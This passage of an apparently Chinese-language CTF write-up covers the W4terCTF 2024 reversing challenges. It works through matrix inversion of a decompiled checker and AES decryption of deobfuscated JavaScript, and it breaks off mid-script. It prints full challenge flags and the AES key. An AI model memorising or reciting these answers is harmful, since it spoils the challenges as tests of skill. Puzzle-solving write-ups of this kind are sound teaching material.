class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">16</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">        dword_83C0[<span class="number">17</span> * i + j] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">16</span>; ++k )</span><br><span class="line">            dword_83C0[<span class="number">17</span> * i + j] += byte_8020[<span class="number">55</span> * i + k] * dword_6060[<span class="number">17</span> * k + j];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( <span class="built_in">memcmp</span>(dword_83C0, &amp;unk_6500, <span class="number">0x154</span>uLL) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line"><span class="keyword">for</span> ( m = <span class="number">0</span>; m &lt;= <span class="number">4</span>; ++m )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> ( n = <span class="number">0</span>; n &lt;= <span class="number">16</span>; ++n )</span><br><span class="line">    &#123;</span><br><span class="line">        dword_83C0[<span class="number">17</span> * m + n] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> ( ii = <span class="number">0</span>; ii &lt;= <span class="number">16</span>; ++ii )</span><br><span class="line">            dword_83C0[<span class="number">17</span> * m + n] += byte_8020[<span class="number">55</span> * m + <span class="number">275</span> + ii] * dword_6660[<span class="number">17</span> * ii + n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( <span class="built_in">memcmp</span>(dword_83C0, &amp;unk_6B00, <span class="number">0x154</span>uLL) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line"><span class="keyword">for</span> ( jj = <span class="number">0</span>; jj &lt;= <span class="number">4</span>; ++jj )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> ( kk = <span class="number">0</span>; kk &lt;= <span class="number">16</span>; ++kk )</span><br><span class="line">    &#123;</span><br><span class="line">        dword_83C0[<span class="number">17</span> * jj + kk] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> ( mm = <span class="number">0</span>; mm &lt;= <span class="number">16</span>; ++mm )</span><br><span class="line">            dword_83C0[<span class="number">17</span> * jj + kk] += byte_8020[<span class="number">55</span> * jj + <span class="number">550</span> + mm] * dword_6C60[<span class="number">17</span> * mm + kk];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">memcmp</span>(dword_83C0, &amp;unk_7100, <span class="number">0x154</span>uLL) != <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p></p><p>以第一组 for 循环为例，实际上是将 byte_8020 的前五行和 dword_6060 进行矩阵乘法，将结果和 unk_6500 对比</p><p>dword_6060 和 unk_6500 的数据可以在内存中找到，进行一个矩阵的逆运算，就能求出 byte_8020 的前五行</p><p></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> data <span class="keyword">import</span> x6500, x6060</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hex_to_arr</span>(<span class="params">hex_str: <span class="built_in">str</span></span>):</span><br><span class="line">    hex_str = hex_str.strip()</span><br><span class="line">    hex_str = hex_str.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    hex_str = hex_str.replace(<span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    hex_str = hex_str.replace(<span class="string">&#x27;  &#x27;</span>, <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    hex_str = hex_str.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    hex_str = [<span class="built_in">int</span>(i, <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> hex_str]</span><br><span class="line">    <span class="keyword">return</span> hex_str</span><br><span class="line"></span><br><span class="line">x6500 = hex_to_arr(x6500)</span><br><span class="line"><span class="comment">#print(len(x6500))</span></span><br><span class="line">x6060 = hex_to_arr(x6060)</span><br><span class="line"><span class="comment">#print(len(x6060))</span></span><br><span class="line">d65 = np.zeros((<span class="number">5</span>,<span class="number">17</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">17</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            d65[i][j] += x6500[i*<span class="number">17</span>*<span class="number">4</span>+j*<span class="number">4</span>+k]*<span class="number">256</span>**(k)</span><br><span class="line">d60 = np.zeros((<span class="number">17</span>, <span class="number">17</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">17</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">17</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            d60[i][j] += x6060[i*<span class="number">17</span>*<span class="number">4</span>+j*<span class="number">4</span>+k]*<span class="number">256</span>**(k)</span><br><span class="line">d60_inv = np.linalg.inv(d60)</span><br><span class="line">d80 = np.dot(d65, d60_inv)</span><br><span class="line"><span class="built_in">print</span>(d80)</span><br></pre></td></tr></table></figure><p></p><p>结果为</p><p></p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">[<span class="comment">[32. 32. 49. 49. 32. 32. 32. 32. 32. 32. 32. 32. 32. 32. 49. 49. 49.]</span></span></span><br><span class="line"><span class="comment"> <span class="comment">[32. 32. 49. 49. 49. 49. 32. 32. 49. 49. 32. 32. 32. 32. 49. 49. 32.]</span></span></span><br><span class="line"><span class="comment"> <span class="comment">[32. 32. 49. 49. 49. 49. 32. 32. 49. 49. 32. 32. 49. 49. 32. 32. 32.]</span></span></span><br><span class="line"><span class="comment"> <span class="comment">[49. 49. 49. 49. 49. 49. 49. 49. 49. 49. 32. 32. 49. 49. 32. 32. 32.]</span></span></span><br><span class="line"><span class="comment"> <span class="comment">[32. 32. 49. 49. 49. 49. 49. 49. 49. 49. 32. 32. 49. 49. 32. 32. 32.]</span>]</span></span><br></pre></td></tr></table></figure><p></p><p>同样的方法，可以得到 byte_8020 的后 10 行</p><h3 id="sub_1483"><a class="anchor" href="#sub_1483">#</a> sub_1483</h3><p>代码的逻辑大致是根据输入的 flag 的后 17 位，构造 byte_8020</p><p>刚才已经求出了 byte_8020，可以用下面的脚本求出 flag 后 17 位</p><p></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line">small_alpha_bet = [</span><br><span class="line"><span class="string">&#x27;      11    11    111111111111111111    11    11       &#x27;</span>,</span><br><span class="line"><span class="string">&#x27;           111  1119911191119                          &#x27;</span>,</span><br><span class="line"><span class="string">&#x27;          11  11111111119999991111111111  11           &#x27;</span>,</span><br><span class="line"><span class="string">&#x27;  9   9111        9        111  9   99      9   111    &#x27;</span>,</span><br><span class="line"><span class="string">&#x27;            111111111199111111991111111111             &#x27;</span>,</span><br><span class="line"><span class="string">&#x27;111  9  9111  1111119111111   111         111  9       &#x27;</span>,</span><br><span class="line"><span class="string">&#x27;99111  111      9           111111  111  111         11&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;   111     9   111      1119            111   111  111 &#x27;</span>,</span><br><span class="line"><span class="string">&#x27;   9         111111      9      9      111  99111   111&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;   111     91111119     111         1119111   1119     &#x27;</span>,</span><br><span class="line"><span class="string">&#x27;    111         111   9  111      1119     111        1&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;        111   11191119    111   991119  111            &#x27;</span>,</span><br><span class="line"><span class="string">&#x27;     9111111111              111      9111   111   1119&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;1119  111111   111        111111111        9111  99111 &#x27;</span>,</span><br><span class="line"><span class="string">&#x27;                        1119        111111   111  111  &#x27;</span>,</span><br><span class="line"><span class="string">&#x27;999     111111        1119  111  11199   9        91119&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;111        111      9     9111     1119  99   111111111&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;        11    11111111111111111111111111    11         &#x27;</span>,</span><br><span class="line"><span class="string">&#x27;          11  11                      11  11           &#x27;</span>,</span><br><span class="line"><span class="string">&#x27;   99111     111111     111   111  9       111      9  &#x27;</span>,</span><br><span class="line"><span class="string">&#x27;        1111119  111111   111              9    111    &#x27;</span>,</span><br><span class="line"><span class="string">&#x27;   111      11191111119   111  99        111111   11111&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;             111   111     11199           9     991111&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;        9111      111      111111      9   99     111  &#x27;</span>,</span><br><span class="line"><span class="string">&#x27;9   9      1111119  1119111      111  11111199       11&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;        9   111111111     111111111      9111111    111&#x27;</span>]</span><br><span class="line"></span><br><span class="line">upper_alpha_bet = [</span><br><span class="line"><span class="string">&#x27;                   111111  99      111  111111111111111&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;      11  11    11                  11    11  11       &#x27;</span>,</span><br><span class="line"><span class="string">&#x27;  111     9  111      11199111111              11111111&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;  11111111  11      1199  11  1199      11  11111111111&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;1111111111119   999          111      9  9      111    &#x27;</span>,</span><br><span class="line"><span class="string">&#x27;111     99   9111                9111111           1119&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;     11111199111111        111111111      111  9111   1&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;      11  111111        111111        111111  111      &#x27;</span>,</span><br><span class="line"><span class="string">&#x27;        11111111111111111111111111111111111111         &#x27;</span>,</span><br><span class="line"><span class="string">&#x27;       1119        111     111   9      111            &#x27;</span>,</span><br><span class="line"><span class="string">&#x27;111   111         9      11199111      1119111         &#x27;</span>,</span><br><span class="line"><span class="string">&#x27;     111        999   111111111         99     1119111 &#x27;</span>,</span><br><span class="line"><span class="string">&#x27;  11          11111111      11111111          11    111&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;1111111111  11            11            11  11111111111&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;  1111  11    11        11  11        11    11  1111111&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;111   9           111111           1119111111   9      &#x27;</span>,</span><br><span class="line"><span class="string">&#x27;9111        11111191111111111119   111         111     &#x27;</span>,</span><br><span class="line"><span class="string">&#x27;  9111    111111   111   9           111111   111111   &#x27;</span>,</span><br><span class="line"><span class="string">&#x27;9111   911199     111111           9     9         9111&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;       111   111  9  9   99   1111119      111        1&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;  1111  11  11            11            11  11  1111111&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;111        111  111111111        111111111           11&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;    1111    11      9999  11  9999      1111  11111    &#x27;</span>,</span><br><span class="line"><span class="string">&#x27;111111     1119111       9      99111   1111119111     &#x27;</span>,</span><br><span class="line"><span class="string">&#x27;111     9   9   111        1119  111      1111111119111&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;  111     111111111111         1119   111111   1111119 &#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">num_bet = [</span><br><span class="line"><span class="string">&#x27;111  9   111     99  111111   111           111     111&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;   111   111111      111     9111   111   1111119111  1&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;             9   9   9111111  9      111111111     111 &#x27;</span>,</span><br><span class="line"><span class="string">&#x27;111       9111111111   111   111        1111111119  911&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;99  9111        1119        1119  111        1119     9&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;   9   111111   9111   9111111111                  9  1&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;     111   111   111  111111              9     9111111&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;          1111111111111111111111111111111111           &#x27;</span>,</span><br><span class="line"><span class="string">&#x27;       9      111111     9    1111111111111119         &#x27;</span>,</span><br><span class="line"><span class="string">&#x27;111   111111999111111  9   9111     111   9111        1&#x27;</span>]</span><br><span class="line"></span><br><span class="line">matrix_8020 = [</span><br><span class="line">[<span class="number">32</span>, <span class="number">32</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">49</span>],</span><br><span class="line">[<span class="number">32</span>, <span class="number">32</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">32</span>],</span><br><span class="line">[<span class="number">32</span>, <span class="number">32</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>],</span><br><span class="line">[<span class="number">49</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>],</span><br><span class="line">[<span class="number">32</span>, <span class="number">32</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>],</span><br><span class="line">[<span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>],</span><br><span class="line">[<span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">32</span>],</span><br><span class="line">[<span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">49</span>],</span><br><span class="line">[<span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">49</span>],</span><br><span class="line">[<span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">49</span>],</span><br><span class="line">[<span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">49</span>],</span><br><span class="line">[<span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">49</span>],</span><br><span class="line">[<span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>],</span><br><span class="line">[<span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">49</span>],</span><br><span class="line">[<span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">32</span>]]</span><br><span class="line"></span><br><span class="line">str_array_8020 = [ (<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> line )) <span class="keyword">for</span> line <span class="keyword">in</span> matrix_8020]</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(str_array_8020)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> str_array_8020:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">        <span class="keyword">if</span> small_alpha_bet[i][<span class="number">0</span>:<span class="number">17</span>] == line:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(i+<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)),end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">        <span class="keyword">if</span> upper_alpha_bet[i][<span class="number">0</span>:<span class="number">17</span>] == line:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(i+<span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)), end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        <span class="keyword">if</span> num_bet[i][<span class="number">0</span>:<span class="number">17</span>] == line:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(i+<span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>)), end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p></p><p>结果为</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">M O U N D W H I 7 e c r a B s</span><br></pre></td></tr></table></figure><p></p><p>由此得到 flag</p><p><code>W4terCTF&#123;1E7_US_drAW_a_plC7ur3_WITH_MA7Rix_4nd_MOUND_WHI7e_craBs&#125;</code></p><h2 id="doudou"><a class="anchor" href="#doudou">#</a> DouDou</h2><p>爬了 js 下来，用了 <code>restringer</code> 反混淆，得到关键函数如下：</p><p></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">check</span>(<span class="params">q</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> V = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(q)),</span><br><span class="line">    x = []</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> P = <span class="number">0</span>; P &lt; <span class="number">12</span>; P++) &#123;</span><br><span class="line">    x.<span class="title function_">push</span>(</span><br><span class="line">      <span class="title function_">e</span>(q[P])</span><br><span class="line">        .<span class="title function_">map</span>(<span class="function">(<span class="params">g</span>) =&gt;</span> g.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">2</span>, <span class="string">&#x27;0&#x27;</span>))</span><br><span class="line">        .<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">  x = x.<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">  <span class="keyword">if</span> (x == r + A + s + y + B + F + w + Q + b + p + i + f) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br></pre></td></tr></table></figure><p></p><p>最后 <code>x == ...</code> 后面的表达式也求出来了，是一个超长 16 进制字符串，太长不贴了。</p><p>分析前面调用 <code>check(STEPS)</code> 的环节可以得到， <code>q</code> 会是一个 <code>[[int * 16] * 12]</code> ，而函数 <code>e</code> ，结合 hint 最终判断为 AES 加密，key 是 <code>W4terDr0pCTF2024</code> ，但是还没完，加密之前每个字节要先异或一个 <code>153</code> 。</p><p>最后生成的 <code>x</code> 要等于那个超长字符串，才会进入 if 内生成 flag 的过程，得到 flag：</p><p></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> P = <span class="number">0</span>; P &lt; <span class="number">12</span>; P++) &#123;</span><br><span class="line">  res += V[P].<span class="title function_">map</span>(<span class="function">(<span class="params">g</span>) =&gt;</span> <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(g))</span><br><span class="line">&#125;</span><br><span class="line">res = res.<span class="title function_">replaceAll</span>(<span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> P = <span class="number">0</span>; P &lt; res.<span class="property">length</span>; P += <span class="number">4</span>) &#123;</span><br><span class="line">  flag += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="built_in">parseInt</span>(res.<span class="title function_">slice</span>(P, P + <span class="number">4</span>), <span class="number">4</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><p>大概就是 res 四个一组，parse 成一个四位四进制整数，再转 ascii 即可。这也就意味着 <code>res</code> 必须是 <code>^[0123]*$</code> ，这也可以检验得到 res 的过程是否正确，反正我们一次就出来了：</p><p></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">final_x = <span class="string">&quot;91d48f9e77505fe36b1537597d68a8be6ef1ced09bba7c9d4ea6a123042d47bbd5776d7b85eebbb7738de44b9af45f9b706640c8dac77d409ceb067e677e7290401e4852527e119b8095a636d0b628e1161142b7dfcbcf2ef890698ba5d279c78df2348e45d1aef635ebfb841284f6d67d1e9d0f0489bcdc5ba303bc791d0e18e46889fa856a463907d82a8137b7b2a863d1896d4dfcd6b84a2f55b50567f705ea7177187609da2e506182007b7e8244acf62c69de4f511760159ffc6dd8e9f5&quot;</span></span><br><span class="line">aes = AES.new(<span class="string">b&quot;W4terDr0pCTF2024&quot;</span>, AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">l = 